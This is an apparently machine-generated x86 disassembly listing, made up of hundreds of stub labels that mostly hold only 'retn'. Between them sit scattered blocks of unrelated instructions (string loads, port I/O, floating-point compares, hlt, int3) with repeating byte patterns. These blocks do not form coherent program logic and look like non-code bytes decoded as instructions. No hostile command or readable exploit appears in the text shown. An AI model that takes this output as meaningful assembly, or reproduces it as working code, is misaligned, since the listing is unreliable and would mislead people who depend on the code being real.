sub_47e5c1
retn
sub_47e5c2
retn
sub_47e5e7
retn
sub_47e5e8
retn
sub_47e5e9
retn
sub_47e5ea
retn
sub_47e5eb
retn
sub_47e5ec
retn
sub_47e5ed
retn
sub_47e5ee
retn
sub_47e5ef
retn
sub_47e5f0
retn
sub_47e5f1
retn
sub_47e5f2
retn
sub_47e5f3
retn
sub_47e5f4
retn
sub_47e5f5
retn
sub_47e5f6
retn
sub_47e5f7
retn
sub_47e5f8
retn
sub_47e5f9
retn
sub_47e62a
push ebx
cmp [ ebx + eax - 0x54c4aec7 ] ebp
lahf
insb
sbb ch [ esp + 0x53535397 ]
mov edx 0x53537991
retn
sub_47e641
retn
sub_47e642
pushad
xor [ 0x9a106da ] 0xac828aba
lodsb [ esi ]
retn
sub_47e64f
retn
sub_47e650
retn
sub_47e651
retn
sub_47e652
retn
sub_47e653
retn
sub_47e654
retn
sub_47e655
retn
sub_47e656
retn
sub_47e657
retn
sub_47e658
retn
sub_47e659
retn
sub_47e65a
pop esp
xlat
adc [ esp + ebp * 4 + 0x43533bac ] ebp
push ebx
push ebx
ficom [ esi ]
mov edi [ edx + 0x535344ad ]
retn
sub_47e66e
retn
sub_47e66f
retn
sub_47e670
retn
sub_47e671
retn
sub_47e672
retn
sub_47e673
retn
sub_47e674
retn
sub_47e675
retn
sub_47e676
retn
sub_47e677
retn
sub_47e678
retn
sub_47e679
push 0xa35fba94
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47e681
retn
sub_47e682
retn
sub_47e683
retn
sub_47e684
retn
sub_47e685
retn
sub_47e686
retn
sub_47e687
or edi [ ecx ]
jae r-xdata
retn
ficom [ esi ]
mov [ 0xffffffffacbb16ba ] eax
lodsb [ esi ]
retn
sub_47e694
retn
sub_47e695
retn
sub_47e696
retn
sub_47e697
retn
sub_47e698
retn
sub_47e699
retn
sub_47e69a
retn
sub_47e69b
retn
sub_47e69c
retn
sub_47e69d
retn
sub_47e69e
or ah [ eax - 0x6d ]
adc edi [ edx - 0x535353ac ]
retn
sub_47e6a8
retn
sub_47e6a9
retn
sub_47e6aa
mov edx 0x535340c8
retn
sub_47e6b0
retn
sub_47e6b1
retn
sub_47e6b2
retn
sub_47e6b3
retn
sub_47e6b4
retn
sub_47e6b5
retn
sub_47e6b6
retn
sub_47e6b7
retn
sub_47e6b8
retn
sub_47e6b9
fsubr [ ebp - 0x53427546 ]
lodsb [ esi ]
retn
sub_47e6c1
retn
sub_47e6c2
retn
sub_47e6c3
retn
sub_47e6c4
retn
sub_47e6c5
fcomp st6
sub [ esi + 0x300acac ] 0xffffffda
push cs
scasd [ edi ]
mov ebx 0xacacb791
rcl [ edi + 0x5139005f ] 0x1
lodsb [ esi ]
add al 0x5f
fmul [ ebx + 0x5340daba ]
push ebx
retn
sub_47e6e6
retn
sub_47e6e7
mov edx 0xacaca6a9
retn
sub_47e6ed
retn
sub_47e6ee
retn
sub_47e6ef
retn
sub_47e6f0
retn
sub_47e6f1
retn
sub_47e720
retn
sub_47e721
retn
sub_47e722
retn
sub_47e723
retn
sub_47e724
retn
sub_47e725
retn
sub_47e726
retn
sub_47e727
retn
sub_47e728
retn
sub_47e729
retn
sub_47e72a
fcom st5
mov [ 0x535353 ] eax
add al 0xba
push edx
pop eax
push ebx
push ebx
retn
sub_47e738
xor eax 0xba9d06da
mov esp 0xc3acac89
retn
sub_47e743
retn
sub_47e744
cmp [ ecx ] esp
fcom [ eax - 0x5ee925cb ]
or edi [ ecx ]
and [ edx + 0x53534281 ] bh
retn
sub_47e755
retn
sub_47e756
retn
sub_47e757
retn
sub_47e758
retn
sub_47e759
retn
sub_47e75a
retn
sub_47e75b
fcom [ esi ]
inc ebx
shl [ esi ] 0x1
stosd [ edi ]
push ebx
rcl [ edi - 0x58f445a1 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47e76b
retn
sub_47e76c
retn
sub_47e76d
retn
sub_47e76e
retn
sub_47e76f
retn
sub_47e770
retn
sub_47e771
retn
sub_47e772
retn
sub_47e773
retn
sub_47e774
retn
sub_47e775
retn
sub_47e776
retn
sub_47e777
retn
sub_47e778
retn
sub_47e779
retn
sub_47e77a
retn
sub_47e77b
retn
sub_47e77c
retn
sub_47e77d
retn
sub_47e77e
retn
sub_47e77f
retn
sub_47e780
retn
sub_47e781
retn
sub_47e782
retn
sub_47e783
retn
sub_47e784
retn
sub_47e7a0
retn
sub_47e7a1
retn
sub_47e7a2
retn
sub_47e7a3
retn
sub_47e7a4
retn
sub_47e7a5
retn
sub_47e7a6
retn
sub_47e7a7
retn
sub_47e7a8
retn
sub_47e7a9
retn
sub_47e7aa
mov ebx 0xacacb0bb
rcl [ edi + 0x5246ba5f ] 0x1
push ebx
push ebx
retn
sub_47e7b8
mov edx 0xacac8b15
retn
sub_47e7be
retn
sub_47e7bf
retn
sub_47e7c0
retn
sub_47e7c1
retn
sub_47e7c2
retn
sub_47e7c3
retn
sub_47e7c4
retn
sub_47e7c5
retn
sub_47e7c6
retn
sub_47e7c7
retn
sub_47e7c8
retn
sub_47e7c9
add [ esp + eax + 0x5e75ba03 ] ch
push ebx
push ebx
retn
sub_47e7d3
retn
sub_47e7d4
retn
sub_47e7d5
retn
sub_47e816
retn
sub_47e817
retn
sub_47e818
push es
fdivr [ edi - 0x5354a446 ]
lodsb [ esi ]
retn
sub_47e821
retn
sub_47e822
retn
sub_47e823
retn
sub_47e824
retn
sub_47e825
retn
sub_47e826
retn
sub_47e827
retn
sub_47e828
retn
sub_47e829
retn
sub_47e82a
retn
sub_47e82b
retn
sub_47e82c
retn
sub_47e82d
retn
sub_47e82e
retn
sub_47e82f
retn
sub_47e830
retn
sub_47e831
retn
sub_47e832
retn
sub_47e833
retn
sub_47e834
retn
sub_47e835
retn
sub_47e836
xor eax 0xbb916da
cmp [ edx + edi * 4 ] esi
movsd [ edi ] [ esi ]
pop ecx
push ebx
push ebx
retn
sub_47e843
retn
sub_47e844
pop esp
xlat
adc [ ebx + edx * 2 + 0x53 ] bl
sar [ ebx - 0x5cc645af ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47e853
retn
sub_47e854
retn
sub_47e855
retn
sub_47e856
retn
sub_47e857
retn
sub_47e858
retn
sub_47e859
retn
sub_47e85a
retn
sub_47e85b
retn
sub_47e85c
retn
sub_47e85d
retn
sub_47e85e
retn
sub_47e85f
retn
sub_47e860
retn
sub_47e861
retn
sub_47e862
retn
sub_47e863
retn
sub_47e864
retn
sub_47e865
retn
sub_47e866
retn
sub_47e867
retn
sub_47e868
retn
sub_47e869
retn
sub_47e86a
retn
sub_47e86b
retn
sub_47e86c
retn
sub_47e86d
retn
sub_47e86e
retn
sub_47e86f
retn
sub_47e870
retn
sub_47e8a3
retn
sub_47e8a4
retn
sub_47e8a5
retn
sub_47e8a6
retn
sub_47e8a8
retn
sub_47e8a9
retn
sub_47e8aa
retn
sub_47e8ab
retn
sub_47e8ac
retn
sub_47e8ad
retn
sub_47e8ae
pop esp
salc
adc eax 0xbaacacb4
stosb [ edi ]
dec ebx
push ebx
push ebx
retn
sub_47e8ba
retn
sub_47e8bb
retn
sub_47e8bc
retn
sub_47e8bd
add edi [ ebx - 0x535372be ]
or cl [ edx ]
mov edx 0x53535c94
retn
sub_47e8cb
retn
sub_47e8ce
sti
push ebx
push ebx
push ebx
mov edx 0xacac8667
retn
sub_47e8d9
retn
sub_47e8da
retn
sub_47e8db
retn
sub_47e8dc
retn
sub_47e8dd
retn
sub_47e8df
retn
sub_47e8ef
jmp r-xdata
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47e910
retn
sub_47e911
retn
sub_47e912
retn
sub_47e913
retn
sub_47e914
retn
sub_47e915
retn
sub_47e916
retn
sub_47e917
retn
sub_47e918
retn
sub_47e919
retn
sub_47e91a
retn
sub_47e91b
retn
sub_47e91c
retn
sub_47e91d
retn
sub_47e91e
retn
sub_47e91f
retn
sub_47e920
or bh [ ecx ]
jge r-xdata
retn
insd
sub [ esp + ebp * 4 - 0x3c3c3c3d ] 0xc3
mov edx 0x53537228
retn
sub_47e933
retn
sub_47e934
retn
sub_47e935
retn
sub_47e936
retn
sub_47e937
retn
sub_47e938
retn
sub_47e939
retn
sub_47e93a
retn
sub_47e93b
pop esp
xlat
mov bl 0xac
lodsb [ esi ]
mov edx 0xacacaa3c
retn
sub_47e947
retn
sub_47e948
retn
sub_47e949
pop esp
xlat
int3
sub_47e95d
push edx
push ebx
push ebx
mov edx 0x53534114
retn
sub_47e966
retn
sub_47e967
retn
sub_47e968
retn
sub_47e969
retn
sub_47e96a
retn
sub_47e96b
retn
sub_47e96c
retn
sub_47e96d
retn
sub_47e96e
retn
sub_47e96f
retn
sub_47e970
retn
sub_47e971
retn
sub_47e972
retn
sub_47e973
retn
sub_47e974
retn
sub_47e975
retn
sub_47e995
retn
sub_47e9c7
retn
sub_47e9c8
retn
sub_47e9c9
retn
sub_47e9ca
retn
sub_47e9cb
retn
sub_47e9cc
retn
sub_47e9cd
retn
sub_47e9ce
retn
sub_47e9cf
retn
sub_47e9d0
retn
sub_47e9d1
fcomp st6
aaa
lodsb [ esi ]
lodsb [ esi ]
lodsb [ esi ]
add eax 0x466fba03
push ebx
push ebx
retn
sub_47e9df
retn
sub_47e9e0
retn
sub_47e9e1
retn
sub_47e9e2
retn
sub_47e9e3
retn
sub_47e9e4
retn
sub_47e9e5
retn
sub_47e9e6
retn
sub_47e9e7
retn
sub_47e9e8
xor eax 0xb8f16da
mov edx 0xacacb592
retn
sub_47e9f3
retn
sub_47e9f4
retn
sub_47e9f5
retn
sub_47e9f6
fcomp [ esi ]
scasd [ edi ]
fsubr [ edi ]
fidivr [ ebx + 0x5fbaa560 ]
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47ea05
retn
sub_47ea06
retn
sub_47ea07
retn
sub_47ea08
retn
sub_47ea09
retn
sub_47ea0a
retn
sub_47ea0b
retn
sub_47ea0c
retn
sub_47ea0d
retn
sub_47ea0e
retn
sub_47ea0f
retn
sub_47ea10
retn
sub_47ea11
retn
sub_47ea12
retn
sub_47ea13
retn
sub_47ea14
retn
sub_47ea15
retn
sub_47ea16
retn
sub_47ea17
retn
sub_47ea18
retn
sub_47ea19
retn
sub_47ea1a
retn
sub_47ea1b
retn
sub_47ea1f
fimul [ esi ]
mov edi [ edx - 0x535372dd ]
retn
sub_47ea28
retn
sub_47ea29
or edi [ ecx ]
cmp eax 0xda359bd8
push ds
mov ebx 0x3534390a
ficomp [ esi ]
mov ecx 0xba3a390a
pop ebp
mov esp 0x39c3acac
push ecx
mov edx 0xacac9f91
retn
sub_47ea4a
retn
sub_47ea4b
retn
sub_47ea4c
retn
sub_47ea4d
retn
sub_47ea4e
retn
sub_47ea4f
retn
sub_47ea50
retn
sub_47ea51
retn
sub_47ea52
retn
sub_47ea53
retn
sub_47ea54
retn
sub_47ea55
retn
sub_47ea56
retn
sub_47ea57
retn
sub_47ea58
retn
sub_47ea7c
fcom [ esi ]
scasd [ edi ]
ficom [ esi ]
mov ebx 0x53400cba
push ebx
retn
sub_47ea88
retn
sub_47ea89
pop esp
in al 0x42
xor eax 0xd63543da
cmp [ edx - 0x53534187 ] 0xd86f1ad8
add eax 0xa0d6ba03
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47eaa3
retn
sub_47eaa4
retn
sub_47eaa5
retn
sub_47eaa6
fsubr [ ebx + 0x4abaacd6 ]
mov ch [ esp + ebp * 4 - 0x533c3c3d ]
and ebx [ ebx - 0x28 ]
xchg esp eax
mov ebx 0xacacb820
mov edx 0x53537a5b
retn
sub_47eac2
pop esp
xlat
sbb al 0xa3
lodsb [ esi ]
lodsb [ esi ]
rcl [ ebx - 0x5c9145af ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47ead1
retn
sub_47ead2
retn
sub_47ead3
fcomp st6
xchg [ esi + 0x3acac ] ebp
lodsb [ esi ]
add eax 0x87eeda47
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
salc
xchg ebx eax
mov edx 0xacac9fd6
retn
sub_47eaec
retn
sub_47eaed
retn
sub_47eaee
retn
sub_47eaef
retn
sub_47eaf0
pop esp
salc
sbb [ eax + 0x53 ] dh
push ebx
pushad
xchg ebx eax
nop
retn
sub_47eafa
retn
sub_47eafb
retn
sub_47eafc
retn
sub_47eafd
retn
sub_47eafe
retn
sub_47eaff
retn
sub_47eb00
retn
sub_47eb01
retn
sub_47eb02
mov edx 0xacac8601
retn
sub_47eb08
retn
sub_47eb09
retn
sub_47eb0a
retn
sub_47eb0b
retn
sub_47eb0c
retn
sub_47eb0d
retn
sub_47eb0e
retn
sub_47eb0f
retn
sub_47eb10
retn
sub_47eb11
retn
sub_47eb12
retn
sub_47eb13
retn
sub_47eb14
retn
sub_47eb15
retn
sub_47eb16
retn
sub_47eb17
retn
sub_47eb35
retn
sub_47eb36
retn
sub_47eb37
pushad
xchg ebx eax
adc edi [ edx + 0x535345eb ]
retn
sub_47eb5a
retn
sub_47eb5b
retn
sub_47eb5c
retn
sub_47eb5d
retn
sub_47eb5e
retn
sub_47eb5f
retn
sub_47eb60
retn
sub_47eb61
retn
sub_47eb62
retn
sub_47eb63
retn
sub_47eb64
retn
sub_47eb65
retn
sub_47eb66
retn
sub_47eb68
retn
sub_47eb69
retn
sub_47eb6a
pushad
movsd [ edi ] [ esi ]
mov edx 0x53537b76
retn
sub_47ebad
retn
sub_47ebae
retn
sub_47ebaf
retn
sub_47ebb0
retn
sub_47ebb1
retn
sub_47ebb2
retn
sub_47ebb3
pushad
mov [ 0xffffffffd8ad0eda ] dh
mov [ 0x39f30eda ] esi
and al bl
mov dh [ 0xffffffffbaf10eda ]
out 0xa3 al
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47ebcd
retn
sub_47ebce
retn
sub_47ebcf
retn
sub_47ebd0
retn
sub_47ebd1
retn
sub_47ebd2
retn
sub_47ebd3
retn
sub_47ebd4
retn
sub_47ebd5
retn
sub_47ebd6
retn
sub_47ebd7
retn
sub_47ebdb
pop eax
push ebx
push ebx
ficom [ edi ]
adc ch [ ebp - 0x5350ca46 ]
lodsb [ esi ]
retn
sub_47ebe8
retn
sub_47ebe9
retn
sub_47ebea
retn
sub_47ebeb
retn
sub_47ebec
retn
sub_47ebed
retn
sub_47ebee
retn
sub_47ebef
retn
sub_47ebf0
retn
sub_47ebf1
retn
sub_47ec12
retn
sub_47ec13
retn
sub_47ec14
retn
sub_47ec15
retn
sub_47ec16
retn
sub_47ec17
retn
sub_47ec18
retn
sub_47ec19
retn
sub_47ec1a
retn
sub_47ec1b
retn
sub_47ec1c
retn
sub_47ec1d
retn
sub_47ec1e
retn
sub_47ec1f
retn
sub_47ec20
retn
sub_47ec21
fcomp st6
fwait
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add ebp [ ebp + eax + 0x5f16d83b ]
push 0x48d2ba90
push ebx
push ebx
retn
sub_47ec36
retn
sub_47ec37
retn
sub_47ec38
retn
sub_47ec39
retn
sub_47ec3a
retn
sub_47ec3b
retn
sub_47ec5a
retn
sub_47ec5b
retn
sub_47ec5c
retn
sub_47ec5d
retn
sub_47ec5e
retn
sub_47ec5f
retn
sub_47ec60
retn
sub_47ec61
retn
sub_47ec62
retn
sub_47ec63
retn
sub_47ec64
retn
sub_47ec65
retn
sub_47ec87
lodsd [ esi ]
lodsb [ esi ]
lodsb [ esi ]
push 0x2e
stosd [ edi ]
pop esp
salc
imul [ ebp - 0x6c9f5354 ]
mov edx 0xacacadf3
retn
sub_47ec9b
retn
sub_47ec9c
retn
sub_47ec9d
retn
sub_47ec9e
retn
sub_47ec9f
retn
sub_47eca0
retn
sub_47eca1
retn
sub_47eca2
retn
sub_47eca3
retn
sub_47eca4
retn
sub_47eca5
retn
sub_47eca6
retn
sub_47eca7
retn
sub_47eca8
retn
sub_47eca9
retn
sub_47ecaa
retn
sub_47ecab
retn
sub_47ecac
add eax 0xe33b5039
in eax dx
sbb bh bl
lodsb [ esi ]
in al 0x97
push ebx
push ebx
push ebx
mov edx 0x5353530e
retn
sub_47ecc0
retn
sub_47ecc1
retn
sub_47ecc2
retn
sub_47ecc3
retn
sub_47ecc4
retn
sub_47ecc5
retn
sub_47ecc6
retn
sub_47ecc7
retn
sub_47ecc8
retn
sub_47ecc9
retn
sub_47ecca
retn
sub_47eccb
retn
sub_47eccc
retn
sub_47eccd
retn
sub_47ecce
retn
sub_47eccf
pop esp
0xd892
sub_47ecd3
xchg edx eax
0xba0cc390 0x4c0c
push ebx
push ebx
retn
sub_47ecde
retn
sub_47ecdf
retn
sub_47ece0
retn
sub_47ece1
pushad
xchg ebx eax
or al 0xd
or [ edx - 0x3c3c3c70 ] bl
retn
sub_47ecec
retn
sub_47eced
retn
sub_47ecee
retn
sub_47ecef
retn
sub_47ecf0
retn
sub_47ecf1
retn
sub_47ecf2
retn
sub_47ecf3
retn
sub_47ecf4
retn
sub_47ecf5
retn
sub_47ecf6
retn
sub_47ecf7
fld [ edx + 0x5c ]
in eax 0x57
pop ebp
pop esp
in eax 0xa9
mov edx 0xacacb767
retn
sub_47ed06
retn
sub_47ed07
ficom [ esi ]
scasd [ edi ]
mov edx 0x535343f5
retn
sub_47ed10
retn
sub_47ed11
retn
sub_47ed12
retn
sub_47ed13
retn
sub_47ed14
retn
sub_47ed15
retn
sub_47ed16
retn
sub_47ed17
retn
sub_47ed18
retn
sub_47ed19
retn
sub_47ed1a
retn
sub_47ed1b
retn
sub_47ed1c
mov ebx 0xacac8561
rcl [ edi - 0x722245b5 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47ed2a
pop esp
in al 0x15
push ebp
lodsb [ esi ]
push ss
cmpsd [ esi ] [ edi ]
mov edx 0x53534a3f
retn
sub_47ed37
push es
fdivr [ edi - 0x50c92ffe ]
push ebx
mov edx 0xacaca05a
retn
sub_47ed45
retn
sub_47ed46
retn
sub_47ed47
retn
sub_47ed48
retn
sub_47ed49
retn
sub_47ed4a
ficom [ esi ]
pop [ eax ]
add edi [ edx - 0x53535ea9 ]
retn
sub_47ed55
retn
sub_47ed56
retn
sub_47ed57
retn
sub_47ed58
or al 0xba
mov [ esp + ebp * 4 - 0x3c3c3c54 ] 0xc3
retn
sub_47ed63
retn
sub_47ed64
retn
sub_47ed65
retn
sub_47ed66
retn
sub_47ed67
retn
sub_47ed68
retn
sub_47ed69
retn
sub_47ed6a
retn
sub_47ed6b
retn
sub_47ed6c
retn
sub_47ed6d
retn
sub_47ed6e
retn
sub_47ed6f
retn
sub_47ed70
retn
sub_47ed71
retn
sub_47ed72
retn
sub_47ed73
retn
sub_47ed74
retn
sub_47ed75
retn
sub_47ed76
retn
sub_47ed77
retn
sub_47ed78
retn
sub_47ed79
retn
sub_47ed7a
retn
sub_47ed7b
retn
sub_47ed7c
retn
sub_47ed7d
retn
sub_47ed7e
retn
sub_47ed7f
retn
sub_47ed80
retn
sub_47ed81
retn
sub_47ed82
retn
sub_47ed83
retn
sub_47ed84
retn
sub_47ed85
pop esp
xlat
sub [ esp + ebp * 4 - 0x79004554 ] bl
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47ed91
retn
sub_47ed92
in al dx
jmp sub_47eded
sub_47eded
fimul [ esi ]
sbb eax ebx
mov esi [ 0xffffffffd81f0eda ]
mov dh [ 0xffffffffba1d0eda ]
or [ ebp + 0x53 ] edx
push ebx
fmul [ ebx + 0x535086ba ]
push ebx
retn
sub_47ee09
retn
sub_47ee0a
retn
sub_47ee0b
retn
sub_47ee0c
retn
sub_47ee0d
ficom [ esi ]
lodsb [ esi ]
add ebx esi
salc
xchg [ esi - 0x44fc5354 ] ebp
xchg [ eax + 0x53 ] al
push ebx
mov edx 0x53535d41
retn
sub_47ee23
retn
sub_47ee24
retn
sub_47ee25
retn
sub_47ee26
retn
sub_47ee27
retn
sub_47ee28
retn
sub_47ee29
retn
sub_47ee2a
cmp [ eax ] esi
mov edx 0xacac8636
retn
sub_47ee32
push es
fdivr [ edi - 0x2d544830 ]
mov edi 0x535357c7
add [ 0xffffffffb9c7bb04 ] al
lodsb [ esi ]
lodsb [ esi ]
fsub [ ebx + 0x54ba8860 ]
mov edi 0xc3c3acac
retn
sub_47ee52
in eax dx
hlt
sub_47ee60
push eax
push ss
scasd [ edi ]
add al [ ebx ]
lodsb [ esi ]
mov bh 0xac
add al 0x4f
mov edx 0xacacade9
pushad
xchg ebx eax
or eax 0xc3909a08
retn
sub_47ee78
retn
sub_47ee79
retn
sub_47ee7a
retn
sub_47ee7b
retn
sub_47ee7c
retn
sub_47ee7d
retn
sub_47ee7e
retn
sub_47ee7f
mov edx 0x535345cc
retn
sub_47ee85
retn
sub_47ee86
retn
sub_47ee87
retn
sub_47ee88
retn
sub_47ee89
pushad
0x5356e5ba 0xc353
retn
sub_47ee92
retn
sub_47ee93
lodsb [ esi ]
add al 0x5b
mov edx 0x53534002
retn
sub_47ee9c
retn
sub_47ee9d
retn
sub_47eecc
retn
sub_47eecd
retn
sub_47eece
retn
sub_47eecf
retn
sub_47eed0
ficom [ edi ]
ja r-xdata
mov edx 0xacac9f2f
retn
mov edx 0xacac8059
retn
sub_47eeda
retn
sub_47eedb
retn
sub_47eedc
retn
sub_47eedd
mov ebx 0xacac84a1
cmp ebx [ edx ]
fadd [ eax - 0x3545fb33 ]
push eax
push ebx
push ebx
retn
sub_47eeee
retn
sub_47eeef
retn
sub_47eef0
retn
sub_47eef1
retn
sub_47eef2
retn
sub_47eef3
retn
sub_47eef4
retn
sub_47eef5
retn
sub_47eef6
retn
sub_47eef7
retn
sub_47eef8
retn
sub_47eef9
retn
sub_47eefa
retn
sub_47eefb
retn
sub_47eefc
retn
sub_47eefd
salc
xchg ebx eax
pop esp
ficom [ edi ]
mov [ esp + ebp * 4 - 0x6f536430 ] gs
retn
sub_47ef0a
retn
sub_47ef0b
retn
sub_47ef0c
retn
sub_47ef0d
retn
sub_47ef0e
retn
sub_47ef0f
retn
sub_47ef10
retn
sub_47ef11
retn
sub_47ef12
retn
sub_47ef13
retn
sub_47ef3b
retn
sub_47ef3c
retn
sub_47ef3d
retn
sub_47ef3e
retn
sub_47ef3f
retn
sub_47ef40
retn
sub_47ef41
retn
sub_47ef42
retn
sub_47ef43
retn
sub_47ef44
retn
sub_47ef45
retn
sub_47ef46
retn
sub_47ef47
retn
sub_47ef48
retn
sub_47ef49
retn
sub_47ef4a
fcom [ edx - 0x45f7f2f4 ]
das
lahf
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47ef55
retn
sub_47ef56
retn
sub_47ef57
retn
sub_47ef58
retn
sub_47ef59
retn
sub_47ef5a
retn
sub_47ef5b
retn
sub_47ef5c
retn
sub_47ef5d
retn
sub_47ef5e
retn
sub_47ef5f
retn
sub_47ef60
retn
sub_47ef61
ficom [ esi ]
add [ ebx ] 0x0
mov edx 0xacac9b43
mov edx 0xacacbb5c
retn
sub_47ef71
retn
sub_47ef72
retn
sub_47ef73
retn
sub_47ef74
retn
sub_47ef75
retn
sub_47ef7a
push ebx
push ebx
salc
xchg ebx eax
fcomp st6
out dx eax
test eax 0x4cbaacac
mov bl 0xac
lodsb [ esi ]
retn
sub_47ef8a
retn
sub_47efd2
retn
sub_47efd3
retn
sub_47efd4
retn
sub_47efd5
retn
sub_47efd6
salc
xchg ebx eax
mov edx 0x53534915
retn
sub_47efde
retn
sub_47efdf
retn
sub_47efe0
retn
sub_47efe1
retn
sub_47efeb
retn
sub_47efec
retn
sub_47efed
retn
sub_47efee
retn
sub_47efef
retn
sub_47eff0
retn
sub_47eff1
retn
sub_47eff2
retn
sub_47eff3
retn
sub_47eff4
retn
sub_47eff5
push es
fdivr [ edi - 0x53615e46 ]
lodsb [ esi ]
lodsb [ esi ]
push ss
cmpsd [ esi ] [ edi ]
rcl [ edx + 0x4e07db5b ] 0x1
xchg edi eax
mov edx 0xacac8708
retn
sub_47f00d
retn
sub_47f00e
retn
sub_47f00f
retn
sub_47f010
retn
sub_47f011
retn
sub_47f012
retn
sub_47f013
retn
sub_47f014
retn
sub_47f015
pop esp
salc
retn 0xaca6
sub_47f01a
lodsb [ esi ]
pop esp
in al 0x15
inc edi
mov edx 0x535351ce
retn
sub_47f025
retn
sub_47f026
retn
sub_47f027
pushad
xchg ebx eax
or eax 0xac853fba
lodsb [ esi ]
ficom [ edi + 0x77 ]
fcom [ edi + 0x77 ]
or dl [ eax - 0x3c3c3c3d ]
rcl [ edi + 0x526cba47 ] 0x1
push ebx
push ebx
retn
sub_47f044
retn
sub_47f045
retn
sub_47f046
retn
sub_47f047
retn
sub_47f048
retn
sub_47f049
retn
sub_47f04a
retn
sub_47f04b
retn
sub_47f04c
retn
sub_47f04d
ficom [ esi ]
jecxz r-xdata
lodsb [ esi ]
add eax 0xacb8adba
lodsb [ esi ]
retn
add edi [ ebx - 0x535377ed ]
sub_47f05e
retn
sub_47f05f
add eax 0xacb5edbb
lodsb [ esi ]
mov edx 0x53535079
retn
sub_47f06b
lodsb [ esi ]
and ebp [ edi + 0x537396ba ]
push ebx
retn
sub_47f074
lodsb [ esi ]
add eax 0xd08bd85f
test al 0xac
mov edx 0x53534d9a
retn
sub_47f082
retn
sub_47f083
retn
sub_47f084
retn
sub_47f085
retn
sub_47f086
retn
sub_47f087
retn
sub_47f088
retn
sub_47f089
retn
sub_47f08a
retn
sub_47f08b
retn
sub_47f08c
retn
sub_47f08d
pushad
xchg ebx eax
adc edi [ edx + 0x53535a20 ]
retn
sub_47f096
retn
sub_47f097
retn
sub_47f098
retn
sub_47f099
retn
sub_47f09a
retn
sub_47f09b
retn
sub_47f09c
retn
sub_47f09d
retn
sub_47f0c7
retn
sub_47f0c8
retn
sub_47f0c9
retn
sub_47f0ca
retn
sub_47f0cb
retn
sub_47f0cc
retn
sub_47f0cd
retn
sub_47f0ff
retn
sub_47f100
retn
sub_47f101
retn
sub_47f102
retn
sub_47f103
retn
sub_47f104
retn
sub_47f105
retn
sub_47f106
retn
sub_47f107
retn
sub_47f108
retn
sub_47f109
retn
sub_47f128
retn
sub_47f129
retn
sub_47f12a
retn
sub_47f12b
retn
sub_47f12c
add al 0x39
and ecx [ edx + edi * 4 ]
enter 0xac8b 0xac
retn
sub_47f136
retn
sub_47f137
retn
sub_47f138
retn
sub_47f139
retn
sub_47f13a
retn
sub_47f13b
retn
sub_47f13c
retn
sub_47f13d
retn
sub_47f170
xor eax 0x5536bd0
fsub [ ebx + 0x424bd75c ]
push ebx
push ebx
mov edx 0x53534255
salc
xchg ebx eax
mov edx 0xacac9edc
retn
sub_47f19e
retn
sub_47f1dc
retn
sub_47f1eb
retn
sub_47f1ec
retn
sub_47f234
retn
sub_47f235
retn
sub_47f236
retn
sub_47f237
retn
sub_47f238
ficom [ esi ]
mov esi 0x16de8860
scasd [ edi ]
add eax [ eax ]
add dh bl
push ss
mov edi 0x95000003
push ss
mov edi 0x7331baeb
push ebx
push ebx
retn
sub_47f253
retn
sub_47f254
retn
sub_47f255
retn
sub_47f256
retn
sub_47f257
retn
sub_47f258
retn
sub_47f259
retn
sub_47f2a0
retn
sub_47f2a1
retn
sub_47f2a2
retn
sub_47f2a3
retn
sub_47f2a4
retn
sub_47f2a5
add ebp [ esi - 0x40d95371 ]
add al 0xba
cli
push ecx
push ebx
push ebx
retn
sub_47f2b3
retn
sub_47f2b4
retn
sub_47f2b5
fcomp st6
sub ebp [ esi + 0x37baacac ]
jb r-xdata
mov edx 0xacacbcc1
retn
push ebx
retn
sub_47f2c1
ficom [ edi ]
arpl [ ebx + 0x39 ] cx
pop ss
ficom [ esi ]
scasd [ edi ]
pushad
mov [ edx - 0x53534f39 ] bh
retn
sub_47f2d2
retn
sub_47f2d3
retn
sub_47f2d4
retn
sub_47f2d5
retn
sub_47f2d6
retn
sub_47f2d7
retn
sub_47f2d8
retn
sub_47f2d9
retn
sub_47f2da
retn
sub_47f2db
mov ebx 0x535359d6
fisubr [ esi ]
cmpsd [ esi ] [ edi ]
mov ebx 0xacac9e53
salc
xchg ebx eax
mov edx 0xacacaf2f
retn
sub_47f2f0
retn
sub_47f2f1
retn
sub_47f2f2
retn
sub_47f2f3
retn
sub_47f2f4
retn
sub_47f2f5
retn
sub_47f2f6
retn
sub_47f2f7
retn
sub_47f2f8
retn
sub_47f2f9
retn
sub_47f2fa
retn
sub_47f2fb
retn
sub_47f2fc
retn
sub_47f2fd
retn
sub_47f2fe
retn
sub_47f2ff
retn
sub_47f300
retn
sub_47f301
retn
sub_47f302
push 0xcfba6715
inc ecx
push ebx
push ebx
retn
sub_47f30b
retn
sub_47f30c
retn
sub_47f30d
retn
sub_47f30e
add ebp [ esi - 0x433e45a5 ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47f318
retn
sub_47f319
retn
sub_47f31a
retn
sub_47f31b
retn
sub_47f31c
mov ebx 0xacaca095
movsb [ edi ] [ esi ]
mov ecx [ eax - 0x6d ]
or ah [ ebx + ecx * 4 - 0x3c3c6f66 ]
retn
sub_47f32d
mov edx 0x53534010
retn
sub_47f334
retn
sub_47f335
retn
sub_47f336
retn
sub_47f337
retn
sub_47f338
xor eax 0xbbf16da
cmp [ esi ] esi
mov edx 0x53535062
retn
sub_47f345
retn
sub_47f346
or edi [ ecx ]
mov edx 0xacac9736
retn
sub_47f34f
retn
sub_47f350
retn
sub_47f351
retn
sub_47f352
retn
sub_47f353
retn
sub_47f354
retn
sub_47f355
retn
sub_47f356
retn
sub_47f357
retn
sub_47f358
retn
sub_47f359
retn
sub_47f35a
retn
sub_47f35b
retn
sub_47f35c
retn
sub_47f35d
retn
sub_47f35e
retn
sub_47f35f
retn
sub_47f360
retn
sub_47f361
retn
sub_47f362
